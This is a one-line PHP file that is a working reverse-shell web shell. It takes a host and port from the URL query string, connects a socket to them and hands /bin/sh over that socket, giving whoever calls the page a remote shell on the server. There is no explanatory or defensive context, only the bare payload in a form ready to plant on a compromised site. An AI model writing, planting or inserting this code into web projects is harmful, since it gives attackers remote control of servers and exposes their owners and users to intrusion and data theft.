<?php $sock=fsockopen($_GET["h"],(int)$_GET["p"],$errno,$errstr,30);proc_open('/bin/sh',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
